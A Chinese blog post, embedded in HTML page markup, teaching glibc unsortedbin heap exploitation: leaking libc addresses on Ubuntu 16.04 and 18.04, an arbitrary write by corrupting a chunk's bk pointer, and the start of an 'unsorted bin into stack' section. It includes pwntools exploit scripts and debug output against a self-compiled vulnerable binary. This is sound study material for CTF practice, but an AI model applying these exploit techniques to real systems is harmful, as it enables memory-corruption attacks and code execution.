@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="距离上一篇堆的知识点很长时间了  这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法 本文讲述unsortedbin在不同环境下的利用办法 这一部分还是比较简单的 基础知识这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin 我们先留意一下随着glibc版本的不同  接着说回正文 一个堆块被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsortedbinAttack">
+<meta property="og:url" content="http://example.com/2022/11/21/unsortedbinAttack/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="距离上一篇堆的知识点很长时间了  这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法 本文讲述unsortedbin在不同环境下的利用办法 这一部分还是比较简单的 基础知识这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin 我们先留意一下随着glibc版本的不同  接着说回正文 一个堆块被">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/637b6ac916f2c2beb18c5165.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/637b6b6216f2c2beb18db731.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/637f9bbc16f2c2beb194f702.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112223179.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112225872.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112257522.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112258579.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112259815.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306093.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306954.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112307511.png">
+<meta property="article:published_time" content="2022-11-21T11:50:21.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:20:54.640Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/637b6ac916f2c2beb18c5165.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>unsortedbinAttack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/23/mrctf2020-shellcode/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/21/ZJCTF-2019-easyheap/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/21/unsortedbinAttack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/21/unsortedbinAttack/&text=unsortedbinAttack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/21/unsortedbinAttack/&is_video=false&description=unsortedbinAttack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unsortedbinAttack&body=Check out this article: http://example.com/2022/11/21/unsortedbinAttack/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/21/unsortedbinAttack/&title=unsortedbinAttack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/21/unsortedbinAttack/&name=unsortedbinAttack&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/21/unsortedbinAttack/&t=unsortedbinAttack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu16-04%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">ubuntu16.04泄露基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu-18-04%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80"><span class="toc-number">3.</span> <span class="toc-text">ubuntu 18.04泄露基址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">4.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-into-stack"><span class="toc-number">5.</span> <span class="toc-text">unsorted bin into stack</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        unsortedbinAttack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-21T11:50:21.000Z" class="dt-published" itemprop="datePublished">2022-11-21</time>
+        
+        (Updated: <time datetime="2023-09-14T17:20:54.640Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/heap/">heap</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>距离上一篇堆的知识点很长时间了  这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法</p>
+<p>本文讲述unsortedbin在不同环境下的利用办法</p>
+<p>这一部分还是比较简单的</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin</p>
+<p>我们先留意一下随着glibc版本的不同  接着说回正文</p>
+<p>一个堆块被释放以后 如果他的大小大于fastbin或者tcache的范围 那么他就会先进入unsortedbin</p>
+<p>如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arean+0x88（这里的数值不是固定的）</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/637b6ac916f2c2beb18c5165.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b6ac916f2c2beb18c5165.png"></a></p>
+<p>此时如果用户再次申请一个chunk</p>
+<p>1.如果该chunk的大小不超过unsortedbin中的chunk大小  那么就会分割出用户需要的</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/637b6b6216f2c2beb18db731.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b6b6216f2c2beb18db731.png"></a></p>
+<p>比如此时我再次申请一个0x40大小的堆块  就是从原来的free chunk中分割出来的  并且其fd和bk域的数值会保留下来</p>
+<p>一起分配给了用户  所以我们可以利用这个特性泄露libc基址(如果程序有打印出chunk内容的机会)</p>
+<p><strong>这里有个小疑点  为什么用户新申请出来的chunk的fd和bk会和原来的chunk的不一样(待解)</strong></p>
+<h2 id="ubuntu16-04泄露基址"><a href="#ubuntu16-04泄露基址" class="headerlink" title="ubuntu16.04泄露基址"></a>ubuntu16.04泄露基址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>自己编译了一个简单的堆题</p>
+<p>程序主体就简单发一下各函数就行了 内容也不必看 就知道有个打印chunk内容的机会和堆溢出 uaf等漏洞</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  LODWORD(v0) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;Page + v3);</span><br><span class="line">    <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">256</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;over size&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v0 = <span class="built_in">malloc</span>(v2);</span><br><span class="line">        v4 = v0;</span><br><span class="line">        <span class="keyword">if</span> ( v0 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;Page + v3) = v4;</span><br><span class="line">          Size[v3] = v2;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(&amp;Page + v1);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      result = vuln(*(&amp;Page + v1), Size[v1]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;Content: %s\n&quot;</span>, *(&amp;Page + v1));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;Page + v1));</span><br><span class="line">    *(&amp;Page + v1) = <span class="number">0LL</span>;</span><br><span class="line">    result = v1;</span><br><span class="line">    Size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gdb动调exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x48</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    00000000  43 6f 6e 74  65 6e 74 3a  20 f8 7b d4  61 1a 7f 0a  │Cont│ent:│ ·&#123;·│a···│</span><br><span class="line">    00000010  31 2e 41 44  44 0a 32 2e  43 48 41 4e  47 45 0a 33  │1.AD│D·2.│CHAN│GE·3│</span><br><span class="line">    00000020  2e 50 52 49  4e 54 0a 34  2e 44 45 4c  0a 3a        │.PRI│NT·4│.DEL│·:│</span><br><span class="line">    0000002e</span><br></pre></td></tr></table></figure>
+
+<p>最后成功泄露出libc地址</p>
+<h2 id="ubuntu-18-04泄露基址"><a href="#ubuntu-18-04泄露基址" class="headerlink" title="ubuntu 18.04泄露基址"></a>ubuntu 18.04泄露基址</h2><p>二进制文件同上</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    create(i,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">10</span>,<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
+
+<p>办法就是利用 tcachebin的一条链表中只能存放7个chunk 只要我们把其填满了 那么再次释放一个相同大小的chunk就会进入unsortedbin</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/637f9bbc16f2c2beb194f702.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637f9bbc16f2c2beb194f702.png"></a></p>
+<p>这里将我们最开始申请的chunk1释放以后 其就因为对应的tcachebin中位置已满 所以进入了unsortedbin  那么接下来利用show函数输出即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    00000000  43 6f 6e 74  65 6e 74 3a  20 30 7d 05  ac 42 7f 0a  │Cont│ent:│ 0&#125;·│·B··│</span><br><span class="line">    00000010  31 2e 41 44  44 0a 32 2e  43 48 41 4e  47 45 0a 33  │1.AD│D·2.│CHAN│GE·3│</span><br><span class="line">    00000020  2e 50 52 49  4e 54 0a 34  2e 44 45 4c  0a 3a        │.PRI│NT·4│.DEL│·:│</span><br><span class="line">    0000002e</span><br></pre></td></tr></table></figure>
+
+<p>这里同时也说明了一点 当tcachebin和unsortedbin中都有free chunk时 且用户申请的chunk大小小于等于二者时unsortedbin优先提供给用户</p>
+<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>如果单独利用那么是比较鸡肋的一个漏洞点 但是如果配合其他漏洞一起使用 效果非常强大</p>
+<p>主要利用的是unsortedbin取出后 会对其链表进行清空</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+
+<p>其中bck在代码开始进行了赋值 <a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#300bck">bck</a> &#x3D; <a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#291victim">victim</a>-&gt;<a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#malloc_chunk::bk">bk</a>;</p>
+<p>也就是说如果我们修改了victim的bk域 就会使得unsorted_chunks (av)+0x18处修改为我们修改的bk域</p>
+<p>以及我们修改的地址+0x10处填入unsorted_chunks (av)</p>
+<p>调试环境 libc2.27</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602200</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(bss_addr-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+
+<p>chunk1用来防止chunk0进入unsortedbin后和top chunk合并</p>
+<p>修改chunk0的bk域为bss_addr-0x10  这样到时候bss_addr 就会被写入unsorted_chunks (av)</p>
+<p>动调看一下</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112223179.png" title="image-20230311222348094" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112223179.png" alt="image-20230311222348094"></a></p>
+<p>你会发现这时候由于main_arena的结构被破坏了 plmalloc仍然认为chunk0处于free状态 但是我们的chunk2确实是申请到了chunk0的空间</p>
+<p>这时候如果我们想要再次申请一个chunk 就会报错 这一点要注意</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112225872.png" title="image-20230311222553826" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112225872.png" alt="image-20230311222553826"></a></p>
+<p>此时各地址的值都如我们预期想象的那样</p>
+<h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h2><p>漏洞的原理在于 plmalloc在申请chunk的时候会先去unsortebin中寻找合适的chunk 如果size不符合则通过bk指针索引下一个</p>
+<p>如果我们修改chunk的size和bk  就可以误导plmalloc去对我们构造的fake chunk进行检查 如果通过了检查 就会分配fake chunk给用户</p>
+<p>跟着下面这个程序动调一下就清楚了(不是我写的 我也不知道出处 可能是how2heap的?)</p>
